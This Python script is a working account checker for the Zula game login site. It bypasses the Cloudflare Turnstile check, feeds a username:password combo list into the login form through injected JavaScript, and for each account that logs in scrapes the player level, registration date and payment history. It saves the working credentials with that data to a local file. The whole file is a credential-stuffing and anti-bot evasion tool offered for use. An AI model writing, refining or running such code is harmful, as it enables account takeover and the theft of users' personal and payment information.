import logging
import tkinter as tk
from tkinter import filedialog
import time
import os
from DrissionPage import ChromiumPage, ChromiumOptions
from selenium.common.exceptions import (
    TimeoutException,
    NoSuchElementException,
    WebDriverException,
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("login_checker.log", mode="w"),
    ],
)


class CloudflareBypasser:
    def __init__(self, driver: ChromiumPage, max_retries=-1, log=True):
        self.driver = driver
        self.max_retries = max_retries
        self.log = log

    def search_recursively_shadow_root_with_iframe(self, ele):
        if ele.shadow_root:
            if ele.shadow_root.child().tag == "iframe":
                return ele.shadow_root.child()
        else:
            for child in ele.children():
                result = self.search_recursively_shadow_root_with_iframe(child)
                if result:
                    return result
        return None

    def search_recursively_shadow_root_with_cf_input(self, ele):
        if ele.shadow_root:
            if ele.shadow_root.ele("tag:input"):
                return ele.shadow_root.ele("tag:input")
        else:
            for child in ele.children():
                result = self.search_recursively_shadow_root_with_cf_input(child)
                if result:
                    return result
        return None

    def locate_cf_button(self):
        button = None
        eles = self.driver.eles("tag:input")
        for ele in eles:
            if "name" in ele.attrs.keys() and "type" in ele.attrs.keys():
                if "turnstile" in ele.attrs["name"] and ele.attrs["type"] == "hidden":
                    button = (
                        ele.parent()
                        .shadow_root.child()("tag:body")
                        .shadow_root("tag:input")
                    )
                    break

        if button:
            return button
        else:
            self.log_message("Basic search failed. Searching for button recursively.")
            ele = self.driver.ele("tag:body")
            iframe = self.search_recursively_shadow_root_with_iframe(ele)
            if iframe:
                button = self.search_recursively_shadow_root_with_cf_input(
                    iframe("tag:body")
                )
            else:
                self.log_message("Iframe not found. Button search failed.")
            return button

    def log_message(self, message):
        if self.log:
            logging.info(message)

    def click_verification_button(self):
        try:
            button = self.locate_cf_button()
            if button:
                self.log_message("Verification button found. Attempting to click.")
                button.click()
            else:
                self.log_message("Verification button not found.")
        except Exception as e:
            self.log_message(f"Error clicking verification button: {e}")

    def is_bypassed(self):
        try:
            title = self.driver.title.lower()
            return "just a moment" not in title
        except Exception as e:
            self.log_message(f"Error checking page title: {e}")
            return False

    def bypass(self):
        try_count = 0
        while not self.is_bypassed():
            if 0 < self.max_retries + 1 <= try_count:
                self.log_message("Exceeded maximum retries. Bypass failed.")
                break
            self.log_message(
                f"Attempt {try_count + 1}: Verification page detected. Trying to bypass..."
            )
            self.click_verification_button()
            try_count += 1
            time.sleep(2)
        if self.is_bypassed():
            self.log_message("Bypass successful.")
            return True
        else:
            self.log_message("Bypass failed.")
            return False


def get_chromium_options() -> ChromiumOptions:
    """
    Configures and returns Chromium options.
    """
    options = ChromiumOptions()

    # Browser Path
    browser_path = os.getenv("CHROME_PATH", "/usr/bin/google-chrome")
    if os.name == "nt":  # Windows
        browser_path = os.getenv(
            "CHROME_PATH", r"C:/Program Files/Google/Chrome/Application/chrome.exe"
        )

    arguments = [
        "-no-first-run",
        "-force-color-profile=srgb",
        "-metrics-recording-only",
        "-password-store=basic",
        "-use-mock-keychain",
        "-export-tagged-pdf",
        "-no-default-browser-check",
        "-disable-background-mode",
        "-enable-features=NetworkService,NetworkServiceInProcess,LoadCryptoTokenExtension,PermuteTLSExtensions",
        "-disable-features=FlashDeprecationWarning,EnablePasswordsAccountStorage",
        "-deny-permission-prompts",
        "-disable-gpu",
        "-accept-lang=en-US",
    ]

    options.set_paths(browser_path=browser_path)
    for argument in arguments:
        options.set_argument(argument)
    return options


def select_file(title):
    root = tk.Tk()
    root.withdraw()
    file_path = filedialog.askopenfilename(
        title=title, filetypes=[("Text files", "*.txt")]
    )
    return file_path


def read_accounts(file_path):
    accounts = []
    try:
        with open(file_path, "r", encoding="utf-8") as file:
            for line in file:
                parts = line.strip().split(":")
                if len(parts) == 2:
                    accounts.append({"username": parts[0], "password": parts[1]})
                else:
                    logging.warning(f"Geçersiz hesap formatı: {line.strip()}")
    except Exception as e:
        logging.error(f"Hesap dosyası okunurken hata oluştu: {str(e)}")
    return accounts


def wait_for_login_success(driver, timeout=3):
    """
    Wait for successful login by checking either URL change or success elements.
    Returns True if login is successful, False otherwise.
    """
    start_time = time.time()
    start_url = driver.url

    while time.time() - start_time < timeout:
        current_url = driver.url

        # Check if URL has changed to profile page
        if "profil" in current_url.lower() or current_url != start_url:
            return True

        # Check for success elements
        success_elements = [
            'xpath://*[contains(text(), "ÇIKIŞ")]',
            'xpath://*[contains(text(), "HEDİYE KODUNU GİR")]',
            'xpath://*[contains(text(), "Profil")]',
        ]

        for selector in success_elements:
            try:
                if driver.ele(selector, timeout=0.5):
                    return True
            except Exception:
                continue

        time.sleep(0.1)

    return False


def check_account(account):
    options = get_chromium_options()
    driver = ChromiumPage(addr_or_opts=options)

    try:
        logging.info(f"Checking account: {account['username']}")
        driver.get("https://hesap.zulaoyun.com/zula-giris-yap")
        time.sleep(4)
        # Handle Cloudflare
        cf_bypasser = CloudflareBypasser(driver)
        cf_bypasser.bypass()

        # Minimum wait for page load
        time.sleep(4)

        # JavaScript to handle form elements and verification
        js_code = """
        // Function to find and fill input fields
        function fillFields(username, password) {
            const userField = document.querySelector('#txtUserName, input[name="UserName"]');
            const passField = document.querySelector('#txtPassword, input[name="Password"]');

            if (userField && passField) {
                userField.value = username;
                passField.value = password;
                return true;
            }
            return false;
        }

        // Function to handle verify checkbox
        function handleVerification() {
            const verifyBox = document.querySelector('.cb-lb input[type="checkbox"]');
            if (verifyBox && !verifyBox.checked) {
                verifyBox.click();
                return true;
            }
            return false;
        }

        // Function to submit form
        function submitForm() {
            const submitBtn = document.querySelector('button[type="submit"]');
            if (submitBtn) {
                submitBtn.click();
                return true;
            }
            return false;
        }

        // Execute all operations
        const filled = fillFields(arguments[0], arguments[1]);
        const verified = handleVerification();
        const submitted = submitForm();

        return {filled: filled, verified: verified, submitted: submitted};
        """

        # Execute JavaScript and get results
        result = driver.run_js(js_code, account["username"], account["password"])

        if not result.get("filled"):
            logging.error("Failed to fill login fields")
            return False

        if result.get("verified"):
            logging.info("Verification checkbox checked")

        if not result.get("submitted"):
            logging.error("Failed to submit form")
            return False

        # Wait for login success
        if not wait_for_login_success(driver):
            logging.warning(f"Login timeout for account: {account['username']}")
            return False

        logging.info(f"Login successful: {account['username']}")

        try:
            # Get profile information
            driver.get("https://hesap.zulaoyun.com/profil")
            time.sleep(2)  # Wait for page load

            # Updated JavaScript to extract profile information
            profile_js = """
            function getProfileInfo() {
                let level = 'N/A';
                let creationDate = 'N/A';

                // Try different selectors for level
                const levelElements = document.querySelectorAll('.progress-bar-text, .level-text, .user-level, [class*="level"]');
                if (levelElements.length > 0) {
                    level = levelElements[0].textContent.trim();
                }

                // Try to find creation date from paragraphs containing text
                const paragraphs = Array.from(document.getElementsByTagName('p'));
                for (const p of paragraphs) {
                    if (p.textContent.includes('KAYIT TARİHİ')) {
                        const span = p.querySelector('span');
                        if (span) {
                            creationDate = span.textContent.trim();
                            break;
                        }
                    }
                }

                return {
                    level: level,
                    creationDate: creationDate
                };
            }
            return getProfileInfo();
            """

            profile_info = driver.run_js(profile_js)
            level = profile_info.get("level", "N/A")
            creation_date = profile_info.get("creationDate", "N/A")

            # Get payment history
            driver.get("https://hesap.zulaoyun.com/profil/odeme-gecmisi")
            time.sleep(2)  # Wait for page load

            # Updated JavaScript for payment details
            payment_js = """
            function getPaymentDetails() {
                const payments = [];
                const tables = document.getElementsByTagName('table');

                if (tables.length > 0) {
                    const rows = tables[0].querySelectorAll('tr');
                    for (let i = 1; i < rows.length; i++) {  // Skip header row
                        const cols = rows[i].getElementsByTagName('td');
                        if (cols.length >= 4) {
                            payments.push({
                                date: cols[0].textContent.trim(),
                                type: cols[1].textContent.trim(),
                                amount: cols[2].textContent.trim(),
                                details: cols[3].textContent.trim()
                            });
                        }
                    }
                }
                return payments;
            }
            return getPaymentDetails();
            """

            payment_details = driver.run_js(payment_js)

            payment_details_str = (
                " | ".join(
                    [
                        f"Date: {p.get('date', '')}, Type: {p.get('type', '')}, "
                        f"Amount: {p.get('amount', '')}, Details: {p.get('details', '')}"
                        for p in payment_details
                    ]
                )
                if payment_details
                else "No payment history"
            )

            # Save to file with UTF-8 encoding
            with open("dogrulanan_hesaplar.txt", "a", encoding="utf-8") as f:
                f.write(
                    f"{account['username']}:{account['password']} | Level:{level} | "
                    f"Kayıt Tarihi:{creation_date} | Ödemeler:{payment_details_str}\n"
                )

            return True
        except Exception as e:
            logging.error(f"Error collecting account details: {str(e)}")
            return False

    except Exception as e:
        logging.error(f"Error checking account {account['username']}: {str(e)}")
        return False
    finally:
        driver.quit()


def main():
    file_path = select_file("Hesap dosyasını seçin")
    if file_path:
        accounts = read_accounts(file_path)
        if accounts:
            for account in accounts:
                check_account(account)
        else:
            logging.error("No valid accounts found in the file")
    else:
        logging.error("No file selected")


if __name__ == "__main__":
    main()
